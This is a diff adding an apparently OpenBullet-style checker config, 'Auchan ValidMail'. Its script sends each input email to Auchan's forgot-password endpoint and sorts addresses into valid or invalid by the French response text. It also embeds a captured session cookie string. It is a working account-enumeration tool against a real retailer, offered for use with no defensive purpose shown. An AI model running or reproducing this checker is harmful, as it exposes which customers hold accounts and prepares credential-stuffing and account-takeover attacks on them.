@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "Auchan ValidMail",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-17T19:42:15.7845259+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://frais.auchan.fr/customer/account/forgotpasswordpost/" 
+  CONTENT "email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: frais.auchan.fr" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://frais.auchan.fr" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Cookie: _gali=forgot-password-form; OptanonConsent=isGpcEnabled=0&datestamp=Wed+Nov+17+2021+19%3A34%3A40+GMT%2B0100+(CET)&version=6.26.0&geolocation=FR%3BGES&isIABGlobal=false&groups=C0001%3A1%2CC0002%3A0%2CC0003%3A0%2CC0004%3A0%2CBG10%3A0&consentId=f9f7f12d-a6b3-406f-974c-e13ebb7091f1&interactionCount=1&landingPath=NotLandingPage&hosts=H41%3A1%2CH35%3A1%2CH47%3A1%2CH48%3A1%2CH34%3A1%2CH39%3A1%2CH66%3A0%2CH70%3A0%2CH71%3A0%2CH72%3A0%2CH73%3A0%2CH36%3A0%2CH11%3A0%2CH77%3A0%2CH78%3A0%2CH79%3A0%2CH80%3A0%2CH20%3A0%2CH82%3A0%2CH83%3A0%2CH84%3A0%2CH85%3A0%2CH91%3A0%2CH92%3A0%2CH57%3A0%2CH28%3A0%2CH95%3A0%2CH96%3A0%2CH98%3A0%2CH101%3A0%2CH102%3A0&AwaitingReconsent=false&genVendors=V20%3A0%2CV13%3A0%2CV32%3A0%2CV8%3A0%2CV7%3A0%2CV29%3A0%2CV6%3A0%2CV30%3A0%2CV14%3A0%2CV28%3A0%2CV31%3A0%2CV26%3A0%2CV11%3A0%2CV10%3A0%2CV18%3A0%2CV15%3A0%2CV21%3A0%2CV5%3A0%2CV9%3A0%2CV4%3A0%2CV17%3A0%2CV23%3A0%2C; _gat_UA-2008294-1=1; auprod=GA1.2.662828204.1637172921; auprod_gid=GA1.2.167920597.1637172921; aurol=GA1.2.662828204.1637172921; aurol_gid=GA1.2.1353781223.1637172921; kameleoonVisitorCode=_js_6askcqeu5roa0xhr; frontendtraiteur=0ocod6ia4e4kfs6tjakt07g306; traiteur.consentCookie=3; OptanonAlertBoxClosed=2021-11-17T18:15:22.612Z; eupubconsent-v2=CPOuxyePOuxyeAcABBENB1CgAAAAAAAAAChQAAAAAAAA.YAAAAAAAAAAA; pickupstore=128; LB_AUCHANAM_HTTP=sessweb07; lark_tracker=GA1.2.44262676-43ba-4a5e-9de0-9ad55414a13f; lark_tracker_gid=GA1.2.176901806.1636974514; _uetsid=2a2e36c0465511ec82fa4335303f8cab; _uetvid=cbecdd10370811ecad2a9f94ecb224ce; _ga_6YSYTBVEHV=GS1.1.1637089745.1.0.1637089749.0; _ga=GA1.1.44262676-43ba-4a5e-9de0-9ad55414a13f; AuchanFR.shop=128|59800|FRANCE; FPID=FPID2.2.Yf%2BDKBjiNpJUe3PBbmVUhtVrub40mBlkX9Xy89eDcrs%3D.1635327094; ccc.demat.onboarding=OK" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1" 
+  HEADER "Referer: https://frais.auchan.fr/customer/account/login/" 
+  HEADER "Content-Length: 26" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "E-mail ou mot de passe invalides. Veuillez réessayer s'il vous plait." 
+  KEYCHAIN Success OR 
+    KEY "Un email vous permettant de ré-initialiser votre mot de passe vous a été envoyé." 
+
